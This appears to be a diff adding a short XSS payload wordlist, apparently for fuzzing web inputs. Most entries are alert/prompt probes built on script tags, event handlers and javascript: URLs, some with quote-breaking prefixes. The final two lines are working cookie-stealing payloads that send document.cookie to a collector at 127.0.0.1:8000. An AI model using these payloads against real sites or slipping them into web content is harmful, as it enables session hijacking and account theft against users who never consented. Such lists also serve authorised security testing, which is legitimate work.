@@ -1,0 +1,11 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+"><script>alert(document.cookie)</script>
+'"><svg/onload=prompt(1)>
+<a href="javascript:alert(1)">Click Me</a>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<script>fetch('http://127.0.0.1:8000/?cookie=' + document.cookie)</script>
+<img src="x" onerror="document.location='http://127.0.0.1:8000/?c='+document.cookie">
